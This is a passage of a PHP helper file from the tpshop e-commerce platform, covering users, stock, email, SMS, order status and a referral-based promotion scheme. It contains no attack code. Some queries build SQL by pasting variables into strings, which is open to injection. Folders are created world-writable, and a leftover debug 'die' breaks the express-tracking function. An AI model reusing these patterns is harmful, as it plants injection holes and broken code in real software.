<?php
/**
 * tpshop
 * ============================================================================
 * * 版权所有 2015-2027 深圳搜豹网络科技有限公司，并保留所有权利。
 * 网站地址: http://www.tp-shop.cn
 * ----------------------------------------------------------------------------
 * 这不是一个自由软件！您只能在不用于商业目的的前提下对程序代码进行修改和使用 .
 * 不允许对程序代码以任何形式任何目的的再发布。
 * 采用最新Thinkphp5助手函数特性实现单字母函数M D U等简写方式
 * $Author: IT宇宙人 2015-08-10 $
 */

use think\Log;
use think\Db;
use qrcode\Qrcode;

define('EXTEND_MODULE', 1);
define('EXTEND_ANDROID', 2);
define('EXTEND_IOS', 3);
define('EXTEND_ENTRUST', 4); //委托服务
define('EXTEND_MINIAPP', 5);
define("EXTEND_H5", 6);//添加终端h5
define('TIME_MOUTH', 4);
/**
 * tpshop检验登陆
 * @param
 * @return bool
 */
function is_login()
{
    if (isset($_SESSION['admin_id']) && $_SESSION['admin_id'] > 0) {
        return $_SESSION['admin_id'];
    } else {
        return false;
    }
}

/**
 * 获取用户信息
 * @param $user_value  用户id 邮箱 手机 第三方id
 * @param int $type 类型 0 user_id查找 1 邮箱查找 2 手机查找 3 第三方唯一标识查找
 * @param string $oauth 第三方来源
 * @return mixed
 */
function get_user_info($user_value, $type = 0, $oauth = '')
{
    $map = [];
    if ($type == 0) {
        $map['user_id'] = $user_value;
    } elseif ($type == 1) {
        $map['email'] = $user_value;
    } elseif ($type == 2) {
        $map['mobile'] = $user_value;
    } elseif ($type == 3) {
        $thirdUser      = Db::name('oauth_users')->where(['openid' => $user_value, 'oauth' => $oauth])->find();
        $map['user_id'] = $thirdUser['user_id'];
    } elseif ($type == 4) {
        $thirdUser      = Db::name('oauth_users')->where(['unionid' => $user_value])->find();
        $map['user_id'] = $thirdUser['user_id'];
    }

    return Db::name('users')->where($map)->find();
}

/**
 *  获取规格图片
 * @param type $goods_id 商品id
 * @param type $item_id 规格id
 * @return
 */
function getGoodsSpecImg($goods_id, $item_id)
{
    $specImg = Db::name('spec_goods_price')->where(["goods_id" => $goods_id, "item_id" => $item_id])->cache(true)->value('spec_img');
    if (empty($specImg)) {
        return '';
    }

    return $specImg;
}

/**
 *  商品缩略图 给于标签调用 拿出商品表的 original_img 原始图来裁切出来的
 * @param type $goods_id 商品id
 * @param type $width 生成缩略图的宽度
 * @param type $height 生成缩略图的高度
 * @param type $item_id 规格id
 */
function goods_thum_images($goods_id, $width, $height, $item_id = 0)
{

    if (empty($goods_id)) return '';
    //判断缩略图是否存在
    $path             = UPLOAD_PATH . "goods/thumb/$goods_id/";
    $goods_thumb_name = "goods_thumb_{$goods_id}_{$item_id}_{$width}_{$height}";

    // 这个商品 已经生成过这个比例的图片就直接返回了
    if (is_file($path . $goods_thumb_name . '.jpg')) return '/' . $path . $goods_thumb_name . '.jpg';
    if (is_file($path . $goods_thumb_name . '.jpeg')) return '/' . $path . $goods_thumb_name . '.jpeg';
    if (is_file($path . $goods_thumb_name . '.gif')) return '/' . $path . $goods_thumb_name . '.gif';
    if (is_file($path . $goods_thumb_name . '.png')) return '/' . $path . $goods_thumb_name . '.png';
    $original_img = '';//先定义空字符变量
    if ($item_id) {
        $original_img = Db::name('spec_goods_price')->where(["goods_id" => $goods_id, 'item_id' => $item_id])->cache(true, 30, 'original_img_cache')->value('spec_img');

    }
    if (empty($original_img)) {
        $original_img = Db::name('goods')->where("goods_id", $goods_id)->cache(true, 30, 'original_img_cache')->value('original_img');
    }


    if (empty($original_img)) {
        return '/public/images/icon_goods_thumb_empty_300.png';
    }

    if (tpCache('oss.oss_switch')) {
        $ossClient = new \app\common\logic\OssLogic;
        if (($ossUrl = $ossClient->getGoodsThumbImageUrl($original_img, $width, $height))) {
            return $ossUrl;
        }
    }

    $original_img = '.' . $original_img; // 相对路径
    if (!is_file($original_img)) {
        return '/public/images/icon_goods_thumb_empty_300.png';
    }

    try {
        require_once 'vendor/topthink/think-image/src/Image.php';
        require_once 'vendor/topthink/think-image/src/image/Exception.php';
        if (strstr(strtolower($original_img), '.gif')) {
            require_once 'vendor/topthink/think-image/src/image/gif/Encoder.php';
            require_once 'vendor/topthink/think-image/src/image/gif/Decoder.php';
            require_once 'vendor/topthink/think-image/src/image/gif/Gif.php';
        }
        $image = \think\Image::open($original_img);

        $goods_thumb_name = $goods_thumb_name . '.' . $image->type();
        // 生成缩略图
        !is_dir($path) && mkdir($path, 0777, true);
        // 参考文章 http://www.mb5u.com/biancheng/php/php_84533.html  改动参考 http://www.thinkphp.cn/topic/13542.html
        $image->thumb($width, $height, 2)->save($path . $goods_thumb_name, NULL, 100); //按照原图的比例生成一个最大为$width*$height的缩略图并保存
        $img_url = '/' . $path . $goods_thumb_name;

        return $img_url;
    } catch (think\Exception $e) {

        return $original_img;
    }
}

/**
 * 商品相册缩略图
 */
function get_sub_images($sub_img, $goods_id, $width, $height)
{
    //判断缩略图是否存在
    $path             = UPLOAD_PATH . "goods/thumb/$goods_id/";
    $goods_thumb_name = "goods_sub_thumb_{$sub_img['img_id']}_{$width}_{$height}";

    //这个缩略图 已经生成过这个比例的图片就直接返回了
    if (is_file($path . $goods_thumb_name . '.jpg')) return '/' . $path . $goods_thumb_name . '.jpg';
    if (is_file($path . $goods_thumb_name . '.jpeg')) return '/' . $path . $goods_thumb_name . '.jpeg';
    if (is_file($path . $goods_thumb_name . '.gif')) return '/' . $path . $goods_thumb_name . '.gif';
    if (is_file($path . $goods_thumb_name . '.png')) return '/' . $path . $goods_thumb_name . '.png';

    if (tpCache('oss.oss_switch')) {
        $ossClient = new \app\common\logic\OssLogic;
        if (($ossUrl = $ossClient->getGoodsAlbumThumbUrl($sub_img['image_url'], $width, $height))) {
            return $ossUrl;
        }
    }

    $original_img = '.' . $sub_img['image_url']; //相对路径
    if (!is_file($original_img)) {
        return '/public/images/icon_goods_thumb_empty_300.png';
    }

    try {
        require_once 'vendor/topthink/think-image/src/Image.php';
        require_once 'vendor/topthink/think-image/src/image/Exception.php';
        if (strstr(strtolower($original_img), '.gif')) {
            require_once 'vendor/topthink/think-image/src/image/gif/Encoder.php';
            require_once 'vendor/topthink/think-image/src/image/gif/Decoder.php';
            require_once 'vendor/topthink/think-image/src/image/gif/Gif.php';
        }
        $image = \think\Image::open($original_img);

        $goods_thumb_name = $goods_thumb_name . '.' . $image->type();
        // 生成缩略图
        !is_dir($path) && mkdir($path, 0777, true);
        // 参考文章 http://www.mb5u.com/biancheng/php/php_84533.html  改动参考 http://www.thinkphp.cn/topic/13542.html
        $image->thumb($width, $height, 2)->save($path . $goods_thumb_name, NULL, 100); //按照原图的比例生成一个最大为$width*$height的缩略图并保存
        $img_url = '/' . $path . $goods_thumb_name;

        return $img_url;
    } catch (think\Exception $e) {

        return $original_img;
    }
}

/**
 * 刷新商品库存, 如果商品有设置规格库存, 则商品总库存 等于 所有规格库存相加
 * @param type $goods_id 商品id
 */
function refresh_stock($goods_id)
{
    $count = M("SpecGoodsPrice")->where("goods_id", $goods_id)->count();
    if ($count == 0) return false; // 没有使用规格方式 没必要更改总库存

    $store_count = M("SpecGoodsPrice")->where("goods_id", $goods_id)->sum('store_count');
    M("Goods")->where("goods_id", $goods_id)->save(array('store_count' => $store_count)); // 更新商品的总库存
}

/**
 * 根据 order_goods 表扣除商品库存
 * @param $order |订单对象或者数组
 * @throws \think\Exception
 */
function minus_stock($order)
{
    $orderGoodsArr = M('OrderGoods')->master()->where("order_id", $order['order_id'])->select();
    foreach ($orderGoodsArr as $key => $val) {
        // 有选择规格的商品
        if (!empty($val['spec_key'])) {   // 先到规格表里面扣除数量 再重新刷新一个 这件商品的总数量
            $SpecGoodsPrice = new \app\common\model\SpecGoodsPrice();
            $specGoodsPrice = $SpecGoodsPrice::get(['goods_id' => $val['goods_id'], 'key' => $val['spec_key']]);
            $specGoodsPrice->where(['goods_id' => $val['goods_id'], 'key' => $val['spec_key']])->setDec('store_count', $val['goods_num']);
            refresh_stock($val['goods_id']);
            if ($val['prom_type'] == 6) {
                db('team_goods_item')->where(['item_id' => $specGoodsPrice['item_id'], 'deleted' => 0])->setInc('sales_sum', $val['goods_num']);
            }
        } else {
            $specGoodsPrice = null;
            M('Goods')->where("goods_id", $val['goods_id'])->setDec('store_count', $val['goods_num']); // 直接扣除商品总数量
        }
        M('Goods')->where("goods_id", $val['goods_id'])->setInc('sales_sum', $val['goods_num']); // 增加商品销售量
        //更新活动商品购买量
        if ($val['prom_type'] == 1 || $val['prom_type'] == 2) {
            $GoodsPromFactory = new \app\common\logic\GoodsPromFactory();
            $goodsPromLogic   = $GoodsPromFactory->makeModule($val, $specGoodsPrice);
            $prom             = $goodsPromLogic->getPromModel();
            if ($prom['is_end'] == 0) {
                $tb = $val['prom_type'] == 1 ? 'flash_sale' : 'group_buy';
                M($tb)->where("id", $val['prom_id'])->setInc('buy_num', $val['goods_num']);
                M($tb)->where("id", $val['prom_id'])->setInc('order_num');
            }
        }
        //更新拼团商品购买量
        if ($val['prom_type'] == 6) {
            Db::name('team_activity')->where('team_id', $val['prom_id'])->setInc('sales_sum', $val['goods_num']);
        }
        update_stock_log($order['user_id'], -$val['goods_num'], $val, $order['order_sn']);//库存日志
    }
}

/**
 * 邮件发送
 * @param $to    接收人
 * @param string $subject 邮件标题
 * @param string $content 邮件内容(html模板渲染后的内容)
 * @throws Exception
 * @throws phpmailerException
 */
function send_email($to, $subject = '', $content = '')
{
    vendor('phpmailer.PHPMailerAutoload'); ////require_once vendor/phpmailer/PHPMailerAutoload.php';
    //判断openssl是否开启
    $openssl_funcs = get_extension_funcs('openssl');
    if (!$openssl_funcs) {
        return array('status' => -1, 'msg' => '请先开启openssl扩展');
    }
    $mail          = new PHPMailer;
    $config        = tpCache('smtp');
    $mail->CharSet = 'UTF-8'; //设定邮件编码，默认ISO-8859-1，如果发中文此项必须设置，否则乱码
    $mail->isSMTP();
    //Enable SMTP debugging
    // 0 = off (for production use)
    // 1 = client messages
    // 2 = client and server messages
    $mail->SMTPDebug = 0;
    //调试输出格式
    //$mail->Debugoutput = 'html';
    //smtp服务器
    $mail->Host = $config['smtp_server'];
    //端口 - likely to be 25, 465 or 587
    $mail->Port = $config['smtp_port'];

    if ($mail->Port == 465) $mail->SMTPSecure = 'ssl';// 使用安全协议
    //Whether to use SMTP authentication
    $mail->SMTPAuth = true;
    //用户名
    $mail->Username = $config['smtp_user'];
    //密码
    $mail->Password = $config['smtp_pwd'];
    //Set who the message is to be sent from
    $mail->setFrom($config['smtp_user']);
    //回复地址
    //$mail->addReplyTo('replyto@example.com', 'First Last');
    //接收邮件方
    if (is_array($to)) {
        foreach ($to as $v) {
            $mail->addAddress($v);
        }
    } else {
        $mail->addAddress($to);
    }

    $mail->isHTML(true);// send as HTML
    //标题
    $mail->Subject = $subject;
    //HTML内容转换
    $mail->msgHTML($content);
    //Replace the plain text body with one created manually
    //$mail->AltBody = 'This is a plain-text message body';
    //添加附件
    //$mail->addAttachment('images/phpmailer_mini.png');
    //send the message, check for errors
    if (!$mail->send()) {
        return array('status' => -1, 'msg' => '发送失败: ' . $mail->ErrorInfo);
    } else {
        return array('status' => 1, 'msg' => '发送成功');
    }
}

/**
 * 检测是否能够发送短信
 * @param unknown $scene
 * @return multitype:number string
 */
function checkEnableSendSms($scene)
{
    $scenes    = C('SEND_SCENE');
    $sceneItem = $scenes[$scene];
    if (!$sceneItem) {
        return array("status" => -1, "msg" => "场景参数'scene'错误!");
    }
    $key       = $sceneItem[2];
    $sceneName = $sceneItem[0];
    $config    = tpCache('sms');
    $smsEnable = $config[$key];

    $isCheckRegCode = tpCache('sms.regis_sms_enable');
    if (!$isCheckRegCode || $isCheckRegCode === 0) {
        return array("status" => 0, "msg" => "短信验证码功能关闭, 无需校验验证码");
    }

    if (!$smsEnable) {
        return array("status" => -1, "msg" => "['$sceneName']发送短信被关闭'");
    }
    //判断是否添加"注册模板"
    $size = M('sms_template')->where("send_scene", $scene)->count('tpl_id');
    if (!$size) {
        return array("status" => -1, "msg" => "请先添加['$sceneName']短信模板");
    }


    return array("status" => 1, "msg" => "可以发送短信");
}

/**
 * 发送短信逻辑
 * @param unknown $scene
 */
function sendSms($scene, $sender, $params, $unique_id = 0)
{
    $smsLogic = new \app\common\logic\SmsLogic;
    return $smsLogic->sendSms($scene, $sender, $params, $unique_id);
}

/**
 * 查询快递
 * @param $postcom  快递公司编码
 * @param $getNu  快递单号
 * @return array  物流跟踪信息数组
 */
function queryExpress($postcom, $getNu)
{
    $url = "https://m.kuaidi100.com/query?type=" . $postcom . "&postid=" . $getNu . "&id=1&valicode=&temp=0.49738534969422676";
    dump($url);
    die("@2");
    $resp = httpRequest($url, "GET");
    return json_decode($resp, true);
}

/**
 * 获取某个商品分类的 儿子 孙子  重子重孙 的 id
 * @param type $cat_id
 */
function getCatGrandsonAll()
{
    $GLOBALS['catGrandson']     = array();
    $GLOBALS['category_id_arr'] = array();
    // 把整张表找出来
    $GLOBALS['category_id_arr'] = M('GoodsCategory')->where(['is_show' => 1])->cache(true, TPSHOP_CACHE_TIME)->getField('id,parent_id');
    // 先把所有顶级分类
    $son_id_arr = M('GoodsCategory')->where(['parent_id' => 0, 'is_show' => 1])->cache(true, TPSHOP_CACHE_TIME)->getField('id', true);
    foreach ($son_id_arr as $k => $v) {
        getCatGrandson1($v);
    }
    return $GLOBALS['catGrandson'];
}

/**
 * 获取某个商品分类的 儿子 孙子  重子重孙 的 id
 * @param type $cat_id
 */
function getCatGrandson1($cat_id)
{
    // 先把自己的id 保存起来
    $GLOBALS['catGrandson'][] = $cat_id;
    // 先把所有儿子找出来
    $son_id_arr = M('GoodsCategory')->where("parent_id", $cat_id)->cache(true, TPSHOP_CACHE_TIME)->getField('id', true);
    foreach ($son_id_arr as $k => $v) {
        getCatGrandson2($v);
    }
    return $GLOBALS['catGrandson'];
}

/**
 * 获取某个商品分类的 儿子 孙子  重子重孙 的 id
 * @param type $cat_id
 */
function getCatGrandson($cat_id)
{
    $GLOBALS['catGrandson']     = array();
    $GLOBALS['category_id_arr'] = array();
    // 先把自己的id 保存起来
    $GLOBALS['catGrandson'][] = $cat_id;
    // 把整张表找出来
    $GLOBALS['category_id_arr'] = M('GoodsCategory')->cache(true, TPSHOP_CACHE_TIME)->getField('id,parent_id');
    // 先把所有儿子找出来
    $son_id_arr = M('GoodsCategory')->where("parent_id", $cat_id)->cache(true, TPSHOP_CACHE_TIME)->getField('id', true);
    foreach ($son_id_arr as $k => $v) {
        getCatGrandson2($v);
    }
    return $GLOBALS['catGrandson'];
}

/**
 * 获取某个文章分类的 儿子 孙子  重子重孙 的 id
 * @param $cat_id
 * @return array|mixed
 */
function getArticleCatGrandson($cat_id)
{
    $GLOBALS['ArticleCatGrandson'] = array();
    $GLOBALS['cat_id_arr']         = array();
    // 先把自己的id 保存起来
    $GLOBALS['ArticleCatGrandson'][] = $cat_id;
    // 把整张表找出来
    $GLOBALS['cat_id_arr'] = M('ArticleCat')->getField('cat_id,parent_id');
    // 先把所有儿子找出来
    $son_id_arr = M('ArticleCat')->where("parent_id", $cat_id)->getField('cat_id', true);
    foreach ($son_id_arr as $k => $v) {
        getArticleCatGrandson2($v);
    }
    return $GLOBALS['ArticleCatGrandson'];
}

/**
 * 递归调用找到 重子重孙
 * @param type $cat_id
 */
function getCatGrandson2($cat_id)
{
    $GLOBALS['catGrandson'][] = $cat_id;
    foreach ($GLOBALS['category_id_arr'] as $k => $v) {
        // 找到孙子
        if ($v == $cat_id) {
            getCatGrandson2($k); // 继续找孙子
        }
    }
}


/**
 * 递归调用找到 重子重孙
 * @param type $cat_id
 */
function getArticleCatGrandson2($cat_id)
{
    $GLOBALS['ArticleCatGrandson'][] = $cat_id;
    foreach ($GLOBALS['cat_id_arr'] as $k => $v) {
        // 找到孙子
        if ($v == $cat_id) {
            getArticleCatGrandson2($k); // 继续找孙子
        }
    }
}

/**
 * 查看某个用户购物车中商品的数量
 * @param type $user_id
 * @param type $session_id
 * @return type 购买数量
 */
function cart_goods_num($user_id = 0, $session_id = '')
{
//    $where = " session_id = '$session_id' ";
//    $user_id && $where .= " or user_id = $user_id ";
    // 查找购物车数量
//    $cart_count =  M('Cart')->where($where)->sum('goods_num');
    $cart_count = Db::name('cart')->where(function ($query) use ($user_id, $session_id) {
        $query->where('session_id', $session_id);
        if ($user_id) {
            $query->whereOr('user_id', $user_id);
        }
    })->sum('goods_num');
    $cart_count = $cart_count ? $cart_count : 0;
    return $cart_count;
}

/**
 * 获取商品库存
 * @param type $goods_id 商品id
 * @param type $key 库存 key
 */
function getGoodNum($goods_id, $key)
{
    if (!empty($key)) {
        return M("SpecGoodsPrice")
            ->alias("s")
            ->join('_Goods_ g ', 's.goods_id = g.goods_id', 'LEFT')
            ->where(['g.goods_id' => $goods_id, 'key' => $key, "is_on_sale" => 1])->getField('s.store_count');
    } else {
        return M("Goods")->where(array("goods_id" => $goods_id, "is_on_sale" => 1))->getField('store_count');
    }
}

/**
 * 获取缓存或者更新缓存
 * @param string $config_key 缓存文件名称
 * @param array $data 缓存数据  array('k1'=>'v1','k2'=>'v3')
 * @return array or string or bool
 */
function tpCache($config_key, $data = array())
{
    $param = explode('.', $config_key);
    if (empty($data)) {
        //如$config_key=shop_info则获取网站信息数组
        //如$config_key=shop_info.logo则获取网站logo字符串
        $config = F($param[0], '', TEMP_PATH);//直接获取缓存文件
        if (empty($config)) {
            //缓存文件不存在就读取数据库
            $res = D('config')->where("inc_type", $param[0])->select();
            if ($res) {
                foreach ($res as $k => $val) {
                    $config[$val['name']] = $val['value'];
                }
                F($param[0], $config, TEMP_PATH);
            }
        }
        if (count($param) > 1) {
            return $config[$param[1]];
        } else {
            return $config;
        }
    } else {
        //更新缓存
        $result = D('config')->where("inc_type", $param[0])->select();
        if ($result) {
            foreach ($result as $val) {
                $temp[$val['name']] = $val['value'];
            }
            foreach ($data as $k => $v) {
                $newArr = array('name' => $k, 'value' => trim($v), 'inc_type' => $param[0]);
                if (!isset($temp[$k])) {
                    M('config')->add($newArr);//新key数据插入数据库
                } else {
                    if ($v != $temp[$k])
                        M('config')->where("name", $k)->save($newArr);//缓存key存在且值有变更新此项
                }
            }
            //更新后的数据库记录
            $newRes = D('config')->where("inc_type", $param[0])->select();
            foreach ($newRes as $rs) {
                $newData[$rs['name']] = $rs['value'];
            }
        } else {
            foreach ($data as $k => $v) {
                $newArr[] = array('name' => $k, 'value' => trim($v), 'inc_type' => $param[0]);
            }
            M('config')->insertAll($newArr);
            $newData = $data;
        }
        return F($param[0], $newData, TEMP_PATH);
    }
}

/**
 * 记录帐户变动
 * @param int $user_id 用户id
 * @param int $user_money 可用余额变动
 * @param int $pay_points 消费积分变动
 * @param string $desc 变动说明
 * @param int    distribut_money 分佣金额
 * @param int $order_id 订单id
 * @param string $order_sn 订单sn
 * @return  bool
 */
function accountLog($user_id, $user_money = 0, $pay_points = 0, $desc = '', $distribut_money = 0, $order_id = 0, $order_sn = '')
{
    /* 插入帐户变动记录 */
    $account_log = array(
        'user_id'     => $user_id,
        'user_money'  => $user_money,
        'pay_points'  => $pay_points,
        'change_time' => time(),
        'desc'        => $desc,
        'order_id'    => $order_id,
        'order_sn'    => $order_sn
    );
    /* 更新用户信息 */
    $update_data = array(
        'user_money'      => ['exp', 'user_money+' . $user_money],
        'pay_points'      => ['exp', 'pay_points+' . $pay_points],
        'distribut_money' => ['exp', 'distribut_money+' . $distribut_money],
    );
    if (($user_money + $pay_points + $distribut_money) == 0) return false;
    $update = Db::name('users')->where("user_id = $user_id")->save($update_data);
    if ($update) {
        M('account_log')->add($account_log);
        return true;
    } else {
        return false;
    }
}

/*
 * 获取地区列表
 */
function get_region_list()
{
    return M('region')->cache(true)->getField('id,name');
}

/*
 * 获取用户地址列表
 */
function get_user_address_list($user_id)
{
    $lists = M('user_address')->where(array('user_id' => $user_id))->select();
    return $lists;
}

/*
 * 获取指定地址信息
 */
function get_user_address_info($user_id, $address_id)
{
    $data = M('user_address')->where(array('user_id' => $user_id, 'address_id' => $address_id))->find();
    return $data;
}

/*
 * 获取用户默认收货地址
 */
function get_user_default_address($user_id)
{
    $data = M('user_address')->where(array('user_id' => $user_id, 'is_default' => 1))->find();
    return $data;
}

/**
 * 获取订单状态的 中文描述名称
 * @param type $order_id 订单id
 * @param type $order 订单数组
 * @return string
 */
function orderStatusDesc($order_id = 0, $order = array())
{
    if (empty($order))
        $order = M('Order')->where("order_id", $order_id)->find();

    // 货到付款
    if ($order['pay_code'] == 'cod') {
        if (in_array($order['order_status'], array(0, 1)) && $order['shipping_status'] == 0)
            return 'WAITSEND'; //'待发货',
    } else // 非货到付款
    {
        if ($order['pay_status'] == 0 && $order['order_status'] == 0)
            return 'WAITPAY'; //'待支付',
        if ($order['pay_status'] == 1 && in_array($order['order_status'], array(0, 1)) && $order['shipping_status'] == 0)
            return 'WAITSEND'; //'待发货',
        if ($order['pay_status'] == 1 && $order['shipping_status'] == 2 && $order['order_status'] == 1)
            return 'PORTIONSEND'; //'部分发货',
    }
    if (($order['shipping_status'] == 1) && ($order['order_status'] == 1))
        return 'WAITRECEIVE'; //'待收货',
    if ($order['order_status'] == 2)
        return 'WAITCCOMMENT'; //'待评价',
    if ($order['order_status'] == 3)
        return 'CANCEL'; //'已取消',
    if ($order['order_status'] == 4)
        return 'FINISH'; //'已完成',
    if ($order['order_status'] == 5)
        return 'CANCELLED'; //'已作废',
    return 'OTHER';
}

/**
 * 获取订单状态的 显示按钮
 * @param type $order_id 订单id
 * @param type $order 订单数组
 * @return array()
 */
function orderBtn($order_id = 0, $order = array())
{
    if (empty($order))
        $order = M('Order')->where("order_id", $order_id)->find();
    /**
     *  订单用户端显示按钮
     * 去支付     AND pay_status=0 AND order_status=0 AND pay_code ! ="cod"
     * 取消按钮  AND pay_status=0 AND shipping_status=0 AND order_status=0
     * 确认收货  AND shipping_status=1 AND order_status=0
     * 评价      AND order_status=1
     * 查看物流  if(!empty(物流单号))
     */
    $btn_arr = array(
        'pay_btn'      => 0, // 去支付按钮
        'cancel_btn'   => 0, // 取消按钮
        'receive_btn'  => 0, // 确认收货
        'comment_btn'  => 0, // 评价按钮
        'shipping_btn' => 0, // 查看物流
        'return_btn'   => 0, // 退货按钮 (联系客服)
    );


    // 货到付款
    if ($order['pay_code'] == 'cod') {

        if (($order['order_status'] == 0 || $order['order_status'] == 1) && $order['shipping_status'] == 0) // 待发货
        {
            $btn_arr['cancel_btn'] = 1; // 取消按钮 (联系客服)
        }
        if ($order['shipping_status'] == 1 && $order['order_status'] == 1) //待收货
        {
            $btn_arr['receive_btn'] = 1;  // 确认收货
        }
    } else {// 非货到付款
        if ($order['pay_status'] == 0 && $order['order_status'] == 0) // 待支付
        {
            $btn_arr['pay_btn']    = 1; // 去支付按钮
            $btn_arr['cancel_btn'] = 1; // 取消按钮
        }
        if ($order['pay_status'] == 1 && in_array($order['order_status'], array(0, 1)) && $order['shipping_status'] == 0) // 待发货
        {
//            $btn_arr['return_btn'] = 1; // 退货按钮 (联系客服)
            if ($order['prom_type'] == 6 || $order['prom_type'] == 4) {
                $btn_arr['cancel_btn'] = 0;
            } else {
                $btn_arr['cancel_btn'] = 1; // 取消按钮
            }
        }
        if ($order['pay_status'] == 1 && $order['order_status'] == 1 && $order['shipping_status'] == 1) //待收货
        {
            $btn_arr['receive_btn'] = 1;  // 确认收货
//            $btn_arr['return_btn'] = 1; // 退货按钮 (联系客服)
        }
    }
    if ($order['order_status'] == 2) {
        $btn_arr['comment_btn'] = 1;  // 评价按钮
        $btn_arr['return_btn']  = 1; // 退货按钮 (联系客服)
    }
    if ($order['shipping_status'] != 0 && in_array($order['order_status'], [1, 2, 4])) {
        $btn_arr['shipping_btn'] = 1; // 查看物流
    }
    if ($order['shipping_status'] == 2 && $order['order_status'] == 1) // 部分发货
    {
//        $btn_arr['return_btn'] = 1; // 退货按钮 (联系客服)
    }

    if ($order['pay_status'] == 1 && shipping_status && $order['order_status'] == 4) // 已完成(已支付, 已发货 , 已完成)
    {
        $btn_arr['return_btn'] = 1; // 退货按钮
    }

    if ($order['order_status'] == 3 && ($order['pay_status'] == 1 || $order['pay_status'] == 4)) {
        $btn_arr['cancel_info'] = 1; // 取消订单详情
    }

    return $btn_arr;
}

/**
 * 给订单数组添加属性  包括按钮显示属性 和 订单状态显示属性
 * @param type $order
 */
function set_btn_order_status($order)
{
    $order_status_arr = C('ORDER_STATUS_DESC');
    if ($order['order_status'] == 3 && $order['pay_status'] == 3) {
        $order['order_status_code'] = 'CANCEL_REFUND'; // 取消并且退款
        $order['order_status_desc'] = $order_status_arr['CANCEL_REFUND'];
    } else {
        $order['order_status_code'] = $order_status_code = orderStatusDesc(0, $order); // 订单状态显示给用户看的
        $order['order_status_desc'] = $order_status_arr[$order_status_code];
    }
    $orderBtnArr = orderBtn(0, $order);
    return array_merge($order, $orderBtnArr); // 订单该显示的按钮
}

/**
 * 缴纳保证金
 * $order_sn 订单号
 */
function rechargebond_rebate($user_id, $user_money = 0, $desc = '', $order_id = 0, $order_sn = '')
{

    /* 插入帐户变动记录 */
    $account_log = array(
        'user_id'     => $user_id,
        'user_money'  => $user_money,
        'pay_points'  => 0,
        'change_time' => time(),
        'desc'        => $desc,
        'order_id'    => $order_id,
        'order_sn'    => $order_sn
    );
    /* 更新用户信息 */
    $update_data = array(
        'deposit' => ['exp', 'deposit+' . $user_money],
    );
    if (($user_money) == 0) return false;
    $update = Db::name('users')->where("user_id = $user_id")->save($update_data);
    Db::name('user_agent')->where("user_id = $user_id")->save(['is_bond' => 1, 'bond_time' => time()]);
    if ($update) {
        M('account_log')->add($account_log);
        return true;
    } else {
        return false;
    }
}


/**
 * VIP充值返利上级
 * $order_sn 订单号
 */
function rechargevip_rebate($order)
{
    //获取返利配置
    $tpshop_config = tpCache('basic');
    //检查配置是否开启
    if ($tpshop_config["rechargevip_on_off"] > 0 && $tpshop_config["rechargevip_rebate_on_off"] > 0) {
        //查询充值VIP上级
        $userid = $order['user_id'];
        //更改用户VIP状态
        Db::name('users')->where('user_id', $userid)->save(['is_vip' => 1]);
        $first_leader = Db::name('users')->where('user_id', $userid)->value('first_leader');
        if ($first_leader) {
            //变动上级资金，记录日志
            $msg = '获取线下' . $userid . '充值VIP返利' . $tpshop_config["rechargevip_rebate"];
            accountLog($first_leader, $tpshop_config["rechargevip_rebate"], 0, $msg, 0, 0, $order['order_sn']);
        }
    }
}

/**
 * 支付完成修改订单
 * @param $order_sn 订单号
 * @param array $ext 额外参数
 * @return bool|void
 */
function update_pay_status($order_sn, $ext = array())
{
    $time   = time();
    $update = array('pay_status' => 1, 'pay_time' => $time);
    // 如果这笔订单已经处理过了
    $count = M('order')->master()->where("order_sn = :order_sn and (pay_status = 0 OR pay_status = 2)")->bind(['order_sn' => $order_sn])->count();   // 看看有没已经处理过这笔订单  支付宝返回不重复处理操作
    if ($count == 0) return false;
    // 找出对应的订单
    $Order = new \app\common\model\Order();
    $order = $Order->master()->where("order_sn", $order_sn)->find();

    // 修改支付状态  已支付
    if ($order['order_status'] == 0) {
        $update['order_status'] = 1;
    }
    if (isset($ext['transaction_id'])) $update['transaction_id'] = $ext['transaction_id'];
    $order_id = M('order')->where("order_sn", $order_sn)->save($update); //更新订单状态

    if ($order['prom_type'] == 0) {
        $enum       = db('users')->field('e_unbound_num,realname')->where('user_id', $order['user_id'])->find();
        $goodsOrder = db('order_goods')->field('goods_id,goods_num,goods_name')->where('order_id', $order['order_id'])->find();
        //设备表添加设备
        for ($i = 1; $i <= $goodsOrder['goods_num']; $i++) {
            $equipment = [
                'user_id'  => $order['user_id'],
                'order_id' => $order['order_id'],
                'e_name'   => $goodsOrder['goods_name'],
                'investor' => $enum['realname'],
                'add_time' => time()
            ];
            if ($goodsOrder['goods_id'] == 243) {
                $equipment['imgurl'] = '/public/images/wechat/NGJ-900.jpg';
            } else {
                $equipment['imgurl'] = '/public/images/wechat/NGJ-650.jpg';
            }
            $equipments[] = $equipment;
        }
        M('equipment')->insertAll($equipments);
        //增加设备数量
        $unbound_num = $enum['e_unbound_num'] + $goodsOrder['goods_num'];
        db('users')->where('user_id', $order['user_id'])->save(['e_unbound_num' => $unbound_num]);

        //消费记录
        $account_log = array(
            'user_id'     => $order['user_id'],
            'user_money'  => -$order['order_amount'],
            'pay_points'  => 0,
            'change_time' => time(),
            'desc'        => '购买设备消费',
            'order_id'    => $order['order_id'],
            'order_sn'    => $order_sn
        );
        M('account_log')->add($account_log);

        //+++++++++++++++++++++++++++++++++++++++++++++++开始晋升处理+++++++++++++++++++++++++++++++++++++++++++++++++++++/
        //1,晋升合伙人身份
        //1.1 购买100台机器，20000维护卡
        $user = M("users")->where("pay_currency>19999 AND level<3")->field("user_id,pay_currency,e_repair_num,e_unbound_num,e_use_num,level")->select();
        if ($user) {
            foreach ($user as $k => $v) {
                $num = $v['e_repair_num'] + $v['e_unbound_num'] + $v['e_use_num'];
                if ($num > 99) {
                    M("users")->where(['user_id' => $v['user_id']])->save(['level' => 3]);
                }
            }
        }
        //1.2团队购买500台机器，直推十个有效客户
        $users = M("users")->where('level<3')->field("user_id,pay_currency,e_repair_num,e_unbound_num,e_use_num,level")->select();
        if ($users) {
            foreach ($users as $kd => $vd) {
                //十个有效客户
                $id     = $vd['user_id'];
                $member = M("users")->where("first_leader='{$id}' AND (e_use_num>0 OR e_repair_num>0)")->count();
                if ($member > 9) {
                    //查找团队是否有购买500台机器
                    $groupu = M("user_group")->where(['user_id' => $id])->field("a_son_id")->find();
                    //查找所有孩子的购买机器数量
                    if ($groupu['a_son_id']) {
                        $arr = explode(",", $groupu['a_son_id']);
                        if ($arr) {
                            $num = 0;
                            foreach ($arr as $ke => $ve) {
